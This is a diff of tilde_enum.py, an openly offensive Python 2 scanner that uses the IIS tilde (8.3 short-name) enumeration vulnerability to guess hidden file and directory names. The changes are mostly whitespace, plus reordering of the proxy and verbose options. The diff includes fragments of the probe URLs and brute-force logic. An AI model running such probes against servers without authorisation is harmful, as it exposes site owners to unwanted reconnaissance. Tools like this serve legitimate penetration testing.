@@ -2,10 +2,10 @@
 
 """
 -------------------------------------------------------------------------------
-Name:        tilde_enum.py
+Name:       tilde_enum.py
 Purpose:    Expands the file names found from the tilde enumeration vuln
-Author:        Micah Hoffman (@WebBreacher)
-Updates:       Crafty Fox (@vulp1n3)
+Author:     Micah Hoffman (@WebBreacher)
+Updates:    Crafty Fox (@vulp1n3)
 -------------------------------------------------------------------------------
 """
 
@@ -33,18 +33,18 @@ targets = []
 
 # Findings is the list of URLs that may be good on the web site
 # TODO - Are all of these really necessary?
-findings_file =  {}        # Files discovered
+findings_file =  {}      # Files discovered
 findings_other = []      # HTTP Response Codes other than 200
-findings_final = []        # Where the guessed files are output
-findings_dir =   []     # Directories discovered
-findings_dir_other =          []
-findings_dir_final =         []
+findings_final = []      # Where the guessed files are output
+findings_dir =   []      # Directories discovered
+findings_dir_other =        []
+findings_dir_final =        []
 findings_dir_other_final =  []
 
 # Location of the extension brute force word list
 exts = 'exts'
 
-# Character set to use for brute forcing ([0-9][a-z]_-. )
+# Character set to use for brute forcing ([0-9][a-z]_-)
 chars = 'abcdefghijklmnopqrstuvwxyz1234567890-_'
 
 # Response codes - user and error
@@ -159,13 +159,13 @@ def checkForTildeVuln(url):
                 pass # just use the default string already set
         else:
             print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
-            print                 '[!]     (Request error: %s)' % server_header.getcode()
-            print                 '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
+            print               '[!]     (Request error: %s)' % server_header.getcode()
+            print               '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
             sys.exit()
     else:
         print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
-        print                '[!]     (Request error: %s)' % server_header.getcode()
-        print                 '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
+        print               '[!]     (Request error: %s)' % server_header.getcode()
+        print               '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
         sys.exit()
 
     # Check to see if the server is vulnerable to the tilde vulnerability
@@ -174,7 +174,7 @@ def checkForTildeVuln(url):
         print bcolors.YELLOW + '[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..' + bcolors.ENDC
     else:
         print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.'
-        print                '[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
+        print               '[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
         sys.exit()
 
     return check_string
@@ -182,11 +182,11 @@ def checkForTildeVuln(url):
 
 def findExtension(url, filename):
     # Find out how many chars the extension has
-    resp1 = getWebServerResponse(url+filename+'~1.%3f/.aspx')        # 1 extension chars
+    resp1 = getWebServerResponse(url+filename+'~1.%3f/.aspx')       # 1 extension chars
     sleep(args.wait)
     resp2 = getWebServerResponse(url+filename+'~1.%3f%3f/.aspx')    # 2 extension chars
     sleep(args.wait)
-    resp3 = getWebServerResponse(url+filename+'~1.%3f%3f%3f/.aspx')    # 3+ extension chars
+    resp3 = getWebServerResponse(url+filename+'~1.%3f%3f%3f/.aspx') # 3+ extension chars
 
     if resp1.code == 404:
         for char1 in chars:
@@ -254,8 +254,8 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
         if resp1.code == 404:  # Got the first valid char
 
             # Check to see if the word is longer than just this char
-            length_gauge4 = getWebServerResponse(url+char+'%3f%3f~1*/.aspx')            # 4 char filename
-            length_gauge5 = getWebServerResponse(url+char+'%3f%3f%3f~1*/.aspx')            # 5 char filename
+            length_gauge4 = getWebServerResponse(url+char+'%3f%3f~1*/.aspx')       # 4 char filename
+            length_gauge5 = getWebServerResponse(url+char+'%3f%3f%3f~1*/.aspx')    # 5 char filename
 
             for char2 in chars:
                 resp2 = getWebServerResponse(url+char+char2+check_string)
@@ -395,7 +395,6 @@ def performLookups(findings, url_good):
                     elif test_response_code != 404 and test_response_code != 400:
                         print '[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response)
                         findings_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)
-
 
     # Match directory names
     print bcolors.GREEN + '[-]  Trying to find directory matches now.' + bcolors.ENDC
@@ -597,11 +596,11 @@ def main():
 parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
 parser.add_argument('-d', dest='dirwordlist', help='an optional wordlist for directory name content')
 parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
+parser.add_argument('-p', dest='proxy',default='', help='Use a proxy host:port')
 parser.add_argument('-u', dest='url', help='URL to scan')
 parser.add_argument('-v', action='store_true', default=False, help='verbose output')
 parser.add_argument('-w', dest='wait', default=0, type=float, help='time in seconds to wait between requests')
 parser.add_argument('wordlist', help='the wordlist file')
-parser.add_argument('-p', dest='proxy',default='', help='Use a proxy host:port')
 args = parser.parse_args()
 
 # COLORIZATION OF OUTPUT
@@ -649,14 +648,13 @@ else:
             self.ENDC = ''
             self.DARKCYAN = ''
 
-if args.v:
-    print bcolors.PURPLE + '[-]  Entering "Verbose Mode"....brace yourself for additional information.' + bcolors.ENDC
-
 if args.proxy:
     print bcolors.PURPLE + '[-]  Using proxy for requests: ' + args.proxy
     proxy = urllib2.ProxyHandler({'http': args.proxy, 'https': args.proxy})
     opener = urllib2.build_opener(proxy)
     urllib2.install_opener(opener)
 
+if args.v:
+    print bcolors.PURPLE + '[-]  Entering "Verbose Mode"....brace yourself for additional information.' + bcolors.ENDC
 
 if __name__ == "__main__": main()
